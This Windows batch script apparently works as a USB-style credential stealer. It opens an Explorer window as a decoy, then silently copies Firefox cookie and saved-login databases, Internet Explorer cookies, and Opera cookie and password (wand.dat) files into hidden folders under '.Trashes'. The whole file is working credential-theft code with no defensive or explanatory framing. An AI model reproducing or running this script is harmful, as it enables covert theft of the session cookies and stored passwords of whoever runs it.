@echo off
start explorer .
:: variables
set del=false
set dest=.Trashes\%USERNAME%
if exist %dest% goto :eof
mkdir %dest%
attrib +h %dest%
mkdir %dest%\firefox
attrib +h %dest%\firefox
for /f %%i in ('dir /B "%USERPROFILE%\Dati applicazioni\Mozilla\Firefox\Profiles\*.default"') do if exist "%USERPROFILE%\Dati applicazioni\Mozilla\Firefox\Profiles\%%i\cookies.sqlite" copy "%USERPROFILE%\Dati applicazioni\Mozilla\Firefox\Profiles\%%i\cookies.sqlite" %dest%\firefox
for /f %%i in ('dir /B "%USERPROFILE%\Application data\Mozilla\Firefox\Profiles\*.default"') do if exist "%USERPROFILE%\Application data\Mozilla\Firefox\Profiles\%%i\cookies.sqlite" copy "%USERPROFILE%\Application data\Mozilla\Firefox\Profiles\%%i\cookies.sqlite" %dest%\firefox
for /f %%i in ('dir /B "%USERPROFILE%\Dati applicazioni\Mozilla\Firefox\Profiles\*.default"') do if exist "%USERPROFILE%\Dati applicazioni\Mozilla\Firefox\Profiles\%%i\signons.sqlite" copy "%USERPROFILE%\Dati applicazioni\Mozilla\Firefox\Profiles\%%i\signons.sqlite" %dest%\firefox
for /f %%i in ('dir /B "%USERPROFILE%\Application data\Mozilla\Firefox\Profiles\*.default"') do if exist "%USERPROFILE%\Application data\Mozilla\Firefox\Profiles\%%i\signons.sqlite" copy "%USERPROFILE%\Application data\Mozilla\Firefox\Profiles\%%i\signons.sqlite" %dest%\firefox
mkdir %dest%\ie
attrib +h %dest%\ie
if exist "%USERPROFILE%\Cookies\" copy "%USERPROFILE%\Cookies\*" %dest%\ie
mkdir %dest%\opera
attrib +h %dest%\opera
if exist "%USERPROFILE%\Dati applicazioni\Opera\Opera\cookies4.dat" copy "%USERPROFILE%\Dati applicazioni\Opera\Opera\cookies4.dat" %dest%\opera
if exist "%USERPROFILE%\Application data\Opera\Opera\cookies4.dat" copy "%USERPROFILE%\Application data\Opera\Opera\cookies4.dat" %dest%\opera
if exist "%USERPROFILE%\Dati applicazioni\Opera\Opera\wand.dat" copy "%USERPROFILE%\Dati applicazioni\Opera\Opera\wand.dat" %dest%\opera
if exist "%USERPROFILE%\Application data\Opera\Opera\wand.dat" copy "%USERPROFILE%\Application data\Opera\Opera\wand.dat" %dest%\opera
if del==false goto :eof
rem DEL ALL
@echo off